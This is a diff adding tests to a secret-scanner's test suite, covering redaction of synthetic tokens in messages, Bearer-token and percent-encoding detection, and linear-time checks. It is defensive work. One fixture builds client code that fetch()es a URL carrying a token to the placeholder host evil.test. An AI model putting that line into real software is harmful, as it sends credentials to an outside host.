@@ -1997,7 +1997,8 @@ test('C7-SECRET 220 C7-5: Bearer /<긴 hex·무작위형 한 마디> → FAIL, �
   for (const l of [j('Authorization: Bea', 'rer /AB12CD34EF56AB78CD90'), j('auth: bea', 'rer ./0123456789abcdef0'), j('Authorization: Bea', 'rer /', QA2_RND)]) {
     assert.ok((await kvSev(l)).includes('FAIL'), l);
   }
-  for (const l of [j('Authorization: Bea', 'rer /api/v1/users/profile'), j('Authorization: Bea', 'rer /static/0123456789abcdef01/app.js'), j('Bea', 'rer /healthcheck-ready')]) {
+  // 230(Codex night-qa3 C7-3): Bearer 문맥은 토큰 형태 마디(16자+ 글자·숫자)가 있으면 경로여도 토큰 — 예전 음성 '/static/<hex 18자>/app.js' 는 이제 FAIL(아래 230 테스트).
+  for (const l of [j('Authorization: Bea', 'rer /api/v1/users/profile'), j('Bea', 'rer /healthcheck-ready')]) {
     assert.deepEqual(await kvSev(l), [], l);
   }
 });
@@ -2026,6 +2027,234 @@ test('C7-SECRET 220 C7-6: URL 질의 퍼센트 인코딩 키·값 → 한 번 �
     assert.deepEqual(await kvSev(l), [], l);
     assert.deepEqual(urlQueryKvHits(l), [], l);
   }
+});
+
+// ── 230 — Codex night-qa3 C7 1~5 ─────────────────────────────
+//   합성 실값(위반 리터럴 0 — 런타임 조립). 메시지 노출 검사는 각 값의 앞 6자 조각까지 본다.
+const QA3_A = j('Qa7bCd8eFg9h', 'Jk2mNp4r'); // Codex 재현 값(20자)
+const QA3_B = j('Zx9yWv8uTs7r', 'Qp6oNm5lKj'); // 22자
+const QA3_C = j('Mn3bVc4xZl5k', 'Jh6gFd7sAp'); // 22자
+const QA3_D = j('gh12ij34kl56', 'mn78op90qr12'); // 소문자+숫자 24자(Bearer)
+const leaks = (text, vals = [QA3_A, QA3_B, QA3_C, QA3_D]) => vals.filter((v) => text.includes(v.slice(0, 6)) || text.includes(v.slice(-6)));
+
+test('C7-SECRET 230 C7-1: 문법 오류 진단은 고정 문구 + 줄·열 숫자만(JSON.parse 메시지의 원문 조각 0)', async () => {
+  const { jsonC7Hits, jsonSyntaxErrorAt } = await import('../lib/rules-source.mjs');
+  // Codex 재현 입력 그대로 + 따옴표 없는 값만 + 줄 여러 개.
+  const cases = [
+    [j('{"tok', 'en":', QA3_A, '}'), '줄 1 열 10'],
+    [QA3_A, '줄 1 열 1'],
+    [j('{\n  "a": 1,\n  "pass', 'word": ', QA3_B, '\n}'), '줄 3 열 15'],
+    [j('{"a":"', QA3_C, '" "b":1}'), '줄 1 열 '],
+  ];
+  for (const [text, where] of cases) {
+    const h = jsonC7Hits(text);
+    assert.equal(h.length, 1, text);
+    assert.equal(h[0].severity, 'FAIL');
+    assert.ok(h[0].message.startsWith('JSON 디코딩 검사 불가 — 문법 오류'), h[0].message);
+    assert.ok(h[0].message.includes(where), h[0].message);
+    assert.deepEqual(leaks(h[0].message), [], h[0].message);
+  }
+  // 위치 검사기 — JSON.parse 와 통과·실패가 같다(조각 조합 대조) · 재귀 없음(깊이 20만).
+  const BS = String.fromCharCode(92);
+  const parts = ['{', '}', '[', ']', ',', ':', '"a"', j('"', BS, 'u00zz"'), j('"', BS, 'n"'), j('"', BS, 'x"'), '1', '-0', '01', '1.', '1e+2', 'true', 'nul', 'null', ' ', '\n', '"', BS, 'x', '"\t"', '.5'];
+  let seed = 230;
+  const rnd = (n) => { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; return (seed >>> 8) % n; };
+  let okN = 0;
+  for (let i = 0; i < 20000; i++) {
+    let s = '';
+    for (let k = 0, len = 1 + rnd(10); k < len; k++) s += parts[rnd(parts.length)];
+    let ok = true;
+    try { JSON.parse(s); } catch { ok = false; }
+    assert.equal(jsonSyntaxErrorAt(s) < 0, ok, JSON.stringify(s));
+    if (ok) okN++;
+  }
+  assert.ok(okN > 200, `정상 표본 ${okN}`);
+  assert.equal(jsonSyntaxErrorAt('['.repeat(200000)), 200000);
+  assert.equal(jsonSyntaxErrorAt(`${'['.repeat(200000)}${']'.repeat(200000)}`), -1);
+});
+
+test('C7-SECRET 230 C7-1: 스캐너 전체 — 합성 실값이 어떤 FAIL/WARN 메시지(CLI 사람용·JSON 출력)에도 나오지 않음', async () => {
+  const root = await makeRoot({
+    source: (s) => {
+      // C7 문법 오류(docs JSON) · JSON 키 자체가 토큰인 맵(키 경로) · 시드 폴더 JSON 문법 오류(C0-SEED).
+      s['docs/design/leak-syntax.json'] = j('{"tok', 'en":', QA3_A, '}\n');
+      // 값의 '=' 를 = 이스케이프로 — 원문 줄 검사는 못 보고 디코딩 단계만 잡아, 키 경로가 메시지에 들어가는 경로를 탄다.
+      s['docs/design/leak-keypath.json'] = j('{"map":{"', QA3_B, '":"pass', 'word', String.fromCharCode(92), 'u003d', QA3_C, '"}}\n');
+      s['server/seed/leak-broken.json'] = j('[{"id":', QA3_C, '}]\n');
+      // C1-FETCH(사용자 정보 토큰) · C2-TRADE(라우트 문자열 질의 속 토큰).
+      s['client/src/leak.ts'] = `export const a = () => ${FETCH}('${HTTPS}${QA3_D}@evil.test/x');\nexport const r = '/orders?k=${QA3_A}';\n`;
+    },
+    seed: (d) => {
+      d['curated-products.json'][0].imageAsset = j(HTTPS, 'cdn.test/a.jpg?sig=', QA3_B);
+      d['curated-products.json'][0].imageLicense = QA3_C;
+    },
+  });
+  const res = scan(root);
+  assert.equal(res.code, 1);
+  const rules = new Set(res.json.findings.map((f) => f.rule));
+  for (const r of ['C7-SECRET', 'C0-SEED', 'C1-FETCH', 'C2-TRADE', 'C1-SEEDURL', 'C6-IMG']) assert.ok(rules.has(r), `${r} 없음: ${JSON.stringify([...rules])}`);
+  // 문법 오류 진단은 줄·열 숫자를 담는다.
+  assert.ok(res.json.findings.some((f) => f.file === 'docs/design/leak-syntax.json' && /줄 1 열 10/.test(f.message)), JSON.stringify(c7All(res, 'docs/design/leak-syntax.json')));
+  assert.ok(res.json.findings.some((f) => f.rule === 'C0-SEED' && /시드 JSON 파싱 실패\(줄 1 열 \d+\)/.test(f.message)));
+  // 키 경로가 비밀 형태면 길이만(디코딩 단계 메시지).
+  assert.ok(c7All(res, 'docs/design/leak-keypath.json').some((f) => f.message.includes('JSON 키 ‹가림')), JSON.stringify(c7All(res, 'docs/design/leak-keypath.json')));
+  assert.deepEqual(leaks(JSON.stringify(res.json.findings)), [], JSON.stringify(res.json.findings, null, 1));
+  // 사람용 CLI 출력(stdout·stderr) 전체.
+  const human = spawnSync(process.execPath, [SCANNER, '--root', root, '--now', FIXED_NOW], { encoding: 'utf8' });
+  assert.equal(human.status, 1);
+  assert.ok(human.stdout.includes('C7-SECRET'), human.stdout);
+  assert.deepEqual(leaks(human.stdout + human.stderr), [], human.stdout);
+});
+
+test('C7-SECRET 230: safeLabel·redactMessage — 비밀 형태 값은 길이만, 일반 식별자는 그대로', async () => {
+  const { safeLabel, redactMessage } = await import('../lib/rules-source.mjs');
+  assert.equal(safeLabel(QA3_A), `‹가림 ${QA3_A.length}자›`);
+  assert.equal(safeLabel(j('map.', QA3_B)), `‹가림 ${QA3_B.length + 4}자›`);
+  assert.equal(safeLabel(j('tok', 'en=abc12345XY')), '‹가림 16자›'); // C7 kv 규칙에 걸리는 짧은 값(WARN 형태)
+  for (const ok of ['cp-001', 'compilerOptions.paths', 'golden-hamster-wheel-30cm', 'ACTIVE', 'CC_BY']) assert.equal(safeLabel(ok), ok);
+  assert.equal(safeLabel('x'.repeat(121)), '‹생략 121자›');
+  assert.equal(redactMessage('하드코딩 시크릿 키=값(소문자·JSON 키 이름, 16자 이상)'), '하드코딩 시크릿 키=값(소문자·JSON 키 이름, 16자 이상)');
+  assert.ok(!redactMessage(j('x — pass', 'word=', QA3_A)).includes(QA3_A.slice(0, 6)));
+});
+
+test('C7-SECRET 230 C7-2: 비ASCII·잘못된·이중 퍼센트 인코딩 질의 값 → 디코딩 후 FAIL(원문·JSON·대문자 env URL 끝)', async () => {
+  const { c7LineHits, jsonC7Hits, urlQueryKvHits } = await import('../lib/rules-source.mjs');
+  const jsonFail = (t) => jsonC7Hits(t).some((h) => h.severity === 'FAIL');
+  const codex = j('u=', HTTPS, 'h.test/?pass%77', 'ord=%ED%95%9C', QA3_A);
+  assert.deepEqual(await kvSev(codex), ['FAIL']);
+  assert.deepEqual(urlQueryKvHits(codex), ['FAIL']);
+  assert.ok(jsonFail(JSON.stringify({ u: codex })));
+  const pos = [
+    j('u=', HTTPS, 'h.test/?pass%77', 'ord=%ed%95%9c', QA3_A), // 소문자 hex
+    j('u=', HTTPS, 'h.test/?pass', 'word=%FF', QA3_A), // 잘못된 바이트 선두(U+FFFD — % 시작 제외에 다시 걸리지 않음)
+    j('u=', HTTPS, 'h.test/?pass', 'word=%ED%95', QA3_A), // 잘린 3바이트 시퀀스
+    j('u=', HTTPS, 'h.test/?pass', 'word=%F0%9F%90%B9', QA3_A), // 4바이트
+    j('u=', HTTPS, 'h.test/?pass%2577', 'ord=', QA3_A), // 이중 인코딩 키
+    j('u=', HTTPS, 'h.test/?pass', 'word=%25ED%2595%259C', QA3_A), // 이중 인코딩 값 선두
+    j('see ', HTTPS, 'h.test/cb#pass%77', 'ord=%ED%95%9C', QA3_A, '&x=1'), // 프래그먼트
+  ];
+  for (const l of pos) {
+    assert.deepEqual(await kvSev(l), ['FAIL'], l);
+    assert.ok(jsonFail(JSON.stringify({ u: l })), l);
+  }
+  assert.ok(c7LineHits(j('TOKEN', '_URL=', HTTPS, 'h.test/cb?pass%77', 'ord=%ED%95%9C', QA3_A), true).length > 0);
+  // 음성: 한글 질의·자리표시·비밀 아닌 키·과잉 표현(%C0%AF)·서로게이트(%ED%A0%80) 단독 값.
+  for (const l of [
+    j('u=', HTTPS, 'h.test/?q=%ED%95%9C%EA%B8%80'),
+    j('u=', HTTPS, 'h.test/?access%5F', 'token=%3Ctoken%3E'),
+    j('u=', HTTPS, 'h.test/?q=%ED%95%9C', QA3_A),
+    j('u=', HTTPS, 'h.test/?pass', 'word=%C0%AF%ED%A0%80'),
+  ]) {
+    assert.deepEqual(await kvSev(l), [], l);
+    assert.deepEqual(urlQueryKvHits(l), [], l);
+  }
+});
+
+test('C7-SECRET 230 C7-2 성능: 퍼센트 디코더 최악 모양 ×2 4단계 — 줄 길이에 비례(예외 없음)', async () => {
+  const { c7LineHits } = await import('../lib/rules-source.mjs');
+  const shapes = [
+    (n) => j('u=', HTTPS, 'h.test/?', 'k%=v%&'.repeat(n)),
+    (n) => j('u=', HTTPS, 'h.test/?', j('pass', 'word=%FF', QA3_A, '&').repeat(n)),
+    (n) => j('u=', HTTPS, 'h.test/?pass', 'word=', '%C3'.repeat(n * 3)),
+    (n) => j('u=', HTTPS, 'h.test/?pass', 'word=', '%ED%95%9C'.repeat(n)),
+  ];
+  for (const mk of shapes) {
+    const ms = [2000, 4000, 8000, 16000].map((n) => {
+      const l = mk(n);
+      c7LineHits(l, false);
+      const t = process.hrtime.bigint();
+      c7LineHits(l, false);
+      return Number(process.hrtime.bigint() - t) / 1e6;
+    });
+    // 제곱이면 16000 단계가 2000 단계의 64배 — 선형 상한(8배)에 잡음 여유를 둔 절대 상한.
+    assert.ok(ms[3] < 1500, `${mk(1).slice(0, 40)}: ${ms.map((x) => x.toFixed(1)).join('/')}ms`);
+  }
+});
+
+test('C7-SECRET 230 C7-3: Bearer 비hex `/…` 토큰 → FAIL(원문·JSON·코드), API 경로는 계속 제외', async () => {
+  const { c7LineHits, jsonC7Hits } = await import('../lib/rules-source.mjs');
+  const codex = j('{"Authorization":"Bea', 'rer /', QA3_D, '"}');
+  assert.deepEqual(await kvSev(codex), ['FAIL']);
+  assert.ok(jsonC7Hits(codex).some((h) => h.severity === 'FAIL'));
+  const pos = [
+    j('Authorization: Bea', 'rer /ab12cd34ef56ab78cd90ef12/ab'), // Codex 두 번째 재현
+    j('Authorization: Bea', 'rer /Qa7bCd8e/Fg9hJk2m/Np4rXy12'), // 짧은 마디로 쪼갠 대·소·숫 토큰
+    j('Authorization: Bea', 'rer ./', QA3_D),
+    j('Authorization: Bea', 'rer ~/', QA3_D),
+    j('authorization: bea', 'rer /', QA3_D),
+    j('Authorization: Bea', 'rer /static/0123456789abcdef01/app.js'), // 220 음성 → 230 양성(토큰 형태 마디)
+  ];
+  for (const l of pos) {
+    assert.deepEqual(await kvSev(l), ['FAIL'], l);
+    assert.ok(c7LineHits(l, true).length > 0, l);
+  }
+  for (const l of [j('Authorization: Bea', 'rer /api/v1/users/profile'), j('Bea', 'rer /healthcheck-ready'), j('Bea', 'rer /oauth2/v2/token/refresh')]) {
+    assert.deepEqual(await kvSev(l), [], l);
+    assert.deepEqual(c7LineHits(l, true), [], l);
+  }
+});
+
+test('C7-SECRET 230 C7-4: 경로 이름 끝(_file·_path·_dir)의 접두 없는 상대 경로는 제외 — 우회(토큰형 마디·일반 이름·주소 끝)는 FAIL', async () => {
+  const { c7LineHits, jsonC7Hits, secretKvHits, secretKvHitsSimple } = await import('../lib/rules-source.mjs');
+  const neg = [
+    j('{"client_secret', '_file":"config/secret-v2.txt"}'), // Codex 재현
+    j('client_secret', '_file=config/secret-v2.txt'),
+    j('token', '_path: keys/550e8400-e29b-41d4-a716-446655440000.json'),
+    j('{"secret', '_dir":"var/lib/withsmall2"}'), // 확장자 없음 + 마디 3개
+    j('CLIENT_SECRET', '_FILE=config/secret-v2.txt'),
+    j('  CLIENT_SECRET', '_FILE: config/secret-v2.txt'),
+    j('ENV CLIENT_SECRET', '_FILE=config/secret-v2.txt'),
+  ];
+  for (const l of neg) {
+    assert.deepEqual(c7LineHits(l, false), [], l);
+    assert.deepEqual(c7LineHits(l, true), [], l);
+    assert.deepEqual(secretKvHits(l), secretKvHitsSimple(l), l);
+  }
+  assert.deepEqual(jsonC7Hits(neg[0]), []);
+  assert.deepEqual(jsonC7Hits(neg[3]), []);
+  // 예외를 우회 통로로: 값이 상대 경로 모양이어도 토큰형 마디·조각이면 FAIL / 경로 끝이 아닌 이름은 넓히지 않음.
+  const pos = [
+    j('{"client_secret', '_file":"', QA3_A, '/x.txt"}'), // 무작위 마디
+    j('{"client_secret', '_file":"', QA3_D, '/a.txt"}'), // 소문자+숫자 24자
+    j('{"token', '_path":"abcdef0123456789abcd/x.json"}'), // hex 마디
+    j('{"pass', 'word_file":"', QA2_HUNTER, '/x.txt"}'), // 글자+숫자 12자 이상 조각
+    j('{"secret', '_dir":"abc123/def456ghi"}'), // 확장자 없음 + 마디 2개(경로 형태 아님)
+    j('{"client', '_secret":"config/secret-v2.txt"}'), // 일반 비밀 이름 — 제외 안 넓힘
+    j('{"token', '_url":"config/secret-v2.txt"}'), // 주소 끝 — URL 값만 제외
+  ];
+  for (const l of pos) {
+    assert.deepEqual(await kvSev(l), ['FAIL'], l);
+    assert.ok(jsonC7Hits(l).some((h) => h.severity === 'FAIL'), l);
+    assert.deepEqual(secretKvHits(l), secretKvHitsSimple(l), l);
+  }
+  assert.ok(c7LineHits(j('CLIENT_SECRET', '_FILE=', QA2_HUNTER, '/x.txt'), true).length > 0);
+  assert.ok(c7LineHits(j('CLIENT_SECRET=config/secret-v2.txt'), true).length > 0);
+  // 같은 런 안 후보 반복(질의 속 secret_file=…&) — 상대 경로 판정이 줄 길이에 비례.
+  for (const n of [4000, 16000]) {
+    const l = j('u=', HTTPS, 'h.test/?', j('secret', '_file=a/b.txt&').repeat(n));
+    c7LineHits(l, false);
+    const t = process.hrtime.bigint();
+    c7LineHits(l, false);
+    assert.ok(Number(process.hrtime.bigint() - t) / 1e6 < 1000, `${n}`);
+  }
+});
+
+test('C7-SECRET 230 C7-5: 닫히지 않은 블록 주석 → 문법 오류 FAIL(조용히 0 아님), 닫힌 주석은 그대로 걷어 냄', async () => {
+  const { jsonC7Hits, stripJsonc } = await import('../lib/rules-source.mjs');
+  for (const bad of ['{"safe":0} /*', '{"safe":0} /* x', '{"a":1 /* c */} /*', '/*', j('{"a":1}\n/* ', QA3_A)]) {
+    const h = jsonC7Hits(bad);
+    assert.equal(h.length, 1, bad);
+    assert.equal(h[0].severity, 'FAIL', bad);
+    assert.ok(h[0].message.startsWith('JSON 디코딩 검사 불가 — 문법 오류'), h[0].message);
+    assert.deepEqual(leaks(h[0].message), []);
+  }
+  assert.deepEqual(jsonC7Hits('{"safe":0} /* 닫힘 */'), []);
+  assert.equal(stripJsonc('{"a":1} /* x').length, '{"a":1} /* x'.length);
+  // 미종결 주석 반복 최악 모양 — 첫 미종결에서 멈춘다(선형).
+  const big = j('{"a":1} ', '/*'.repeat(200000));
+  const t = process.hrtime.bigint();
+  assert.equal(jsonC7Hits(big)[0].severity, 'FAIL');
+  assert.ok(Number(process.hrtime.bigint() - t) / 1e6 < 1000);
 });
 
 test('C7-SECRET 201 MED-3: 제외 값이 겹치는 긴 한 줄(83,200자·200,000자) — 200ms 안, 질의 속 access_token 재탐색은 유지', async () => {
